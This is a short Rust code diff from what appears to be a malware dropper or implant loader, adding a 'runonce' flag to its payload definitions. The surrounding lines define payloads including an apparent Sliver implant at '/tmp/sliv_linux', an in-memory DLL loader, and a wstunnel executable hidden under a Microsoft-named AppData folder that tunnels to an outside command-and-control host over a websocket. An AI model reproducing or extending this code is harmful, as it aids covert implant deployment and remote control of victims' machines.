@@ -114,6 +114,7 @@ fn main() {
                 path: "/tmp/sliv_linux".to_string(),
                 cmdline: "".to_string(),
                 thread: true,
+                runonce: false,
             }),
         ];
     } else if payload == "dll".to_string() {
@@ -249,7 +250,8 @@ exec(decoded_script)
         Payload::Exec(Exec {
             path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
             cmdline:String::from("client -L tcp://127.0.0.1:1080:127.0.0.1:10 --connection-min-idle 5 wss://sliverperso.kaboum.xyz:8080"),
-            thread:true
+            thread:true,
+            runonce:false
         }),
 
         Payload::DllFromMemory(DllFromMemory {
